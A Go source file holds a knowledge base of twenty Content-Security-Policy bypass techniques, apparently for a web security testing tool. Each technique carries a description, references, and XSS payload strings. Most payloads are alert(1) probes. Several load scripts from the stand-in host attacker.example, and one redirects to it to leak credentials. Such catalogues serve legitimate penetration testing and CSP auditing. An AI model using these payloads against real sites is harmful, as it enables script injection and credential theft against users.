package csp

// Technique is one CSP bypass technique from the built-in knowledge base.
type Technique struct {
	Key         string
	Name        string
	Description string
	Payloads    []string
	References  []string
}

const (
	refHackTricks  = "https://book.hacktricks.wiki/en/pentesting-web/content-security-policy-csp-bypass/index.html"
	refPayloads    = "https://github.com/swisskyrepo/PayloadsAllTheThings"
	refJSONBee     = "https://github.com/zigoo0/JSONBee"
	refPortSwigger = "https://portswigger.net/research/bypassing-csp-with-policy-injection"
	refHuli        = "https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/"
	refOWASP       = "https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html"
	refCSPEval     = "https://csp-evaluator.withgoogle.com/"
)

var techniqueOrder = []string{
	"no_csp",
	"report_only",
	"unsafe_inline",
	"unsafe_eval",
	"nonce_reuse",
	"strict_dynamic",
	"wildcard",
	"data_uri",
	"angular_cdn",
	"jsonp",
	"base_uri",
	"object_src",
	"third_party",
	"self_upload",
	"path_redirect",
	"policy_injection",
	"dom_xss",
	"service_worker",
	"trusted_types",
	"form_action",
}

var techniqueKB = map[string]Technique{
	"no_csp": {
		Key:         "no_csp",
		Name:        "No enforced CSP",
		Description: "No Content-Security-Policy is enforced on the page. Inline scripts and event handlers execute normally; standard XSS payloads apply.",
		Payloads:    []string{`<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`},
		References:  []string{refOWASP, refHackTricks},
	},
	"report_only": {
		Key:         "report_only",
		Name:        "Report-Only CSP",
		Description: "A Content-Security-Policy-Report-Only header is present but not enforced. Violations are only reported, so blocked payloads still execute.",
		Payloads:    []string{`<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`},
		References:  []string{refHackTricks},
	},
	"unsafe_inline": {
		Key:         "unsafe_inline",
		Name:        "'unsafe-inline' allows inline script and event handlers",
		Description: "The effective script directive allows 'unsafe-inline' (or no script-src/default-src exists). Inline <script> and on* handlers execute. Note: 'unsafe-inline' is ignored when nonces/hashes are present in CSP3.",
		Payloads: []string{
			`<script>alert(1)</script>`,
			`<svg onload=alert(1)>`,
			`<img src=x onerror=alert(1)>`,
			`"><script>alert(1)</script>`,
		},
		References: []string{refHackTricks, refCSPEval},
	},
	"unsafe_eval": {
		Key:         "unsafe_eval",
		Name:        "'unsafe-eval' enables eval/Function gadgets",
		Description: "The policy allows eval(), Function(), and string timers. If an injection point reaches a script gadget or any allowed script executes, string-to-code evaluation can run attacker JavaScript. Often chained with a DOM/script gadget.",
		Payloads: []string{
			`<script src="data:;base64,YWxlcnQoMSk="></script>`,
			`<img src=x onerror="eval('alert(1)')">`,
			`<script>setTimeout('alert(1)',0)</script>`,
		},
		References: []string{refHackTricks, refCSPEval},
	},
	"nonce_reuse": {
		Key:         "nonce_reuse",
		Name:        "Nonce reuse / nonce leaked in DOM",
		Description: "Script nonces are visible in the page markup. When an HTML injection point exists, an injected script carrying the same nonce satisfies the policy, bypassing script-src. This works with nonce-based and 'strict-dynamic' policies.",
		Payloads: []string{
			`<script nonce="NONCE">alert(1)</script>`,
			`<script nonce="NONCE" src="https://attacker.example/x.js"></script>`,
		},
		References: []string{refHackTricks, refCSPEval},
	},
	"strict_dynamic": {
		Key:         "strict_dynamic",
		Name:        "'strict-dynamic' script gadget / trusted loader",
		Description: "With 'strict-dynamic', host allowlists are ignored and scripts loaded by an already-trusted (nonced/hashed) script are allowed. Look for trusted loaders that read URLs or element attributes (modulepreload, data-* selectors) that can be injected before the loader runs.",
		Payloads: []string{
			`<link rel="modulepreload" data-plugin-name="probe" href="https://attacker.example/probe.js">`,
			`<script src="https://attacker.example/gadget.js"></script>`,
		},
		References: []string{refHackTricks},
	},
	"wildcard": {
		Key:         "wildcard",
		Name:        "Wildcard / broad scheme allowlist",
		Description: "script-src contains '*', 'https:' or 'http:' or a wildcard host. Scripts can be loaded from attacker-controlled origins (including wildcard subdomains vulnerable to takeover or JSONP).",
		Payloads: []string{
			`<script src="https://attacker.example/x.js"></script>`,
			`<script src="https://attacker.example/x.js" nonce="NONCE"></script>`,
		},
		References: []string{refHackTricks, refCSPEval},
	},
	"data_uri": {
		Key:         "data_uri",
		Name:        "data: script source",
		Description: "The policy allows data: in script-src. JavaScript can be embedded directly in a script tag via a data URI, without any external host.",
		Payloads: []string{
			`<script src="data:text/javascript,alert(1)"></script>`,
			`<script src="data:text/javascript;base64,YWxlcnQoMSk="></script>`,
		},
		References: []string{refHackTricks},
	},
	"angular_cdn": {
		Key:         "angular_cdn",
		Name:        "AngularJS gadget from an allowlisted CDN",
		Description: "A JavaScript CDN (cdnjs, googleapis, jsDelivr, unpkg, code.angularjs.org) is allowlisted. Load a vulnerable AngularJS build from it and use ng-app/ng-csp expressions (constructor or $eval) to execute code without inline scripts/eval.",
		Payloads: []string{
			`<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.min.js"></script><div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>`,
			`<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.min.js"></script><div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>`,
			`<script src="https://ajax.googleapis.com/ajax/services/feed/find?v=1.0&callback=alert&context=1"></script>`,
		},
		References: []string{refHuli, refHackTricks},
	},
	"jsonp": {
		Key:         "jsonp",
		Name:        "JSONP endpoint on an allowlisted host",
		Description: "An allowlisted third-party host exposes a JSONP endpoint (or an open redirect). Loading its JSONP URL with an attacker callback executes JavaScript in the page context. JSONBee maintains lists of known JSONP endpoints.",
		Payloads: []string{
			`<script src="https://allowed.example/jsonp?callback=alert(1)//"></script>`,
			`<script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>`,
			`<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=alert"></script>`,
		},
		References: []string{refJSONBee, refHackTricks},
	},
	"base_uri": {
		Key:         "base_uri",
		Name:        "Missing base-uri hijacks relative scripts",
		Description: "base-uri is not defined, so an injected <base> tag can change how relative script URLs resolve. If the page loads a nonced relative script, point it at an attacker host.",
		Payloads: []string{
			`<base href="https://attacker.example/">`,
		},
		References: []string{refHackTricks},
	},
	"object_src": {
		Key:         "object_src",
		Name:        "Missing object-src (legacy plugins)",
		Description: "object-src is not defined and default-src does not cover it. Legacy object/embed or Flash-based execution may bypass script-src in older browsers; modern browsers largely block this.",
		Payloads: []string{
			`<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>`,
		},
		References: []string{refHackTricks},
	},
	"third_party": {
		Key:         "third_party",
		Name:        "Abusable third-party allowlist",
		Description: "The allowlist includes hosting/CDN domains where an attacker can register content (CloudFront, S3, Azure, Heroku, Firebase, jsDelivr, etc.). Host attacker JavaScript there and load it from the allowed origin.",
		Payloads: []string{
			`<script src="https://attacker.app.cloudfront.net/x.js"></script>`,
			`<script src="https://attacker.azurewebsites.net/x.js"></script>`,
			`<script src="https://attacker.herokuapp.com/x.js"></script>`,
		},
		References: []string{refHackTricks},
	},
	"self_upload": {
		Key:         "self_upload",
		Name:        "Same-origin upload with script-src 'self'",
		Description: "script-src allows 'self'. If the application offers a file upload, a same-origin uploaded file served with a JavaScript MIME type can be loaded as a script.",
		Payloads: []string{
			`<script src="/uploads/avatar.png.js"></script>`,
		},
		References: []string{refHackTricks},
	},
	"path_redirect": {
		Key:         "path_redirect",
		Name:        "Path restriction bypass via redirect or RPO",
		Description: "CSP paths can be bypassed through server-side redirects (the final path is not checked) or Relative Path Overwrite (RPO) where the browser and server interpret ..%2f differently.",
		Payloads: []string{
			`<script src="https://allowed.example/redirect?next=https://attacker.example/x.js"></script>`,
			`<script src="https://allowed.example/scripts/react/..%2fangular%2fangular.js"></script>`,
		},
		References: []string{refHackTricks},
	},
	"policy_injection": {
		Key:         "policy_injection",
		Name:        "CSP policy injection",
		Description: "If user input is reflected into the CSP header, inject directives that override script-src (Chrome supports script-src-elem/script-src-attr precedence; legacy Edge could drop the policy with ';_').",
		Payloads: []string{
			`;script-src-elem *; script-src-attr *`,
			`;script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'`,
			`;_`,
		},
		References: []string{refPortSwigger},
	},
	"dom_xss": {
		Key:         "dom_xss",
		Name:        "DOM XSS is not mitigated by CSP",
		Description: "CSP only controls resource loading and inline execution. DOM sinks that write markup (innerHTML, insertAdjacentHTML, document.write, iframe srcdoc) can still create executable markup; require-trusted-types-for is needed to block them.",
		Payloads: []string{
			`#<img src=x onerror=alert(1)>`,
			`javascript:alert(1)`,
		},
		References: []string{refOWASP, refHackTricks},
	},
	"service_worker": {
		Key:         "service_worker",
		Name:        "Service worker importScripts",
		Description: "A service worker's importScripts() is not restricted by the page's CSP. If a JavaScript file from an allowed origin can register or control a service worker, it can import attacker scripts.",
		Payloads: []string{
			`navigator.serviceWorker.register('/allowed-sw.js')`,
		},
		References: []string{refHackTricks},
	},
	"trusted_types": {
		Key:         "trusted_types",
		Name:        "Weak Trusted Types enforcement",
		Description: "require-trusted-types-for is present, but a permissive default policy or pass-through createHTML policy can still allow DOM XSS. Check report-only deployment and policies that return their input unchanged.",
		Payloads: []string{
			`document.body.innerHTML = '<img src=x onerror=alert(1)>'`,
		},
		References: []string{refHackTricks, refOWASP},
	},
	"form_action": {
		Key:         "form_action",
		Name:        "Missing form-action / credential theft",
		Description: "form-action is not defined. Even without JavaScript, an injected form can submit credentials to the same origin and a Referer/redirect leak can exfiltrate them; CSP does not stop this.",
		Payloads: []string{
			`<form action="/"><input name=email><input type=password name=password><input type=submit></form>`,
			`<meta name="referrer" content="unsafe-url"><meta http-equiv="Refresh" content="0;url=https://attacker.example/">`,
		},
		References: []string{refHackTricks},
	},
}

// AllTechniques returns the full bypass knowledge base in a stable order.
func AllTechniques() []Technique {
	var out []Technique
	for _, key := range techniqueOrder {
		if technique, ok := techniqueKB[key]; ok {
			out = append(out, technique)
		}
	}
	return out
}

// TechniqueByKey returns one technique by key.
func TechniqueByKey(key string) (Technique, bool) {
	technique, ok := techniqueKB[key]
	return technique, ok
}

func techniqueByKey(key string) (Technique, bool) {
	return TechniqueByKey(key)
}
